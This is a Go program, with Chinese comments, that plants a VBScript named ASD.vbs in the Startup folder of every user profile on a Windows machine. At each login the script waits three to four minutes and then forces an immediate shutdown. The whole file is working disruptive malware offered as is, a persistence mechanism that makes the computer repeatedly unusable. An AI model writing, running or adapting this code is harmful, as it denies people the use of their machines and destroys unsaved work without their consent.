package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
)

func main() {
	// 获取所有用户的目录
	usersDir := "C:\\Users\\"
	// 打开用户目录
	dir, err := os.Open(usersDir)
	if err != nil {
		fmt.Println("没找到USER路径:", err)
		return
	}
	defer dir.Close()

	// 读取用户目录内容
	userDirs, err := dir.Readdirnames(-1)
	if err != nil {
		fmt.Println("读取失败:", err)
		return
	}

	// 遍历每个用户目录，查找启动文件夹
	for _, user := range userDirs {
		startupPath := filepath.Join(usersDir, user, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
		if _, err := os.Stat(startupPath); err == nil {
			fmt.Println("找到启动文件夹路径", user, ":", startupPath)

			// 构建 .vbs 文件路径
			vbsFilePath := filepath.Join(startupPath, "ASD.vbs")

			// 写入 .vbs 文件内容
			vbsContent := `Set objShell = CreateObject("WScript.Shell")
			Randomize
			RandomTime = Int((240000 - 180000 + 1) * Rnd + 180000)
			WScript.Sleep RandomTime
			objShell.Run "shutdown.exe -s -t 0"`
			err := ioutil.WriteFile(vbsFilePath, []byte(vbsContent), 0644)
			if err != nil {
				fmt.Println("写入失败:", err)
				continue
			}
			fmt.Println("创建了 ASD.vbs 在", startupPath)
		}
	}
}
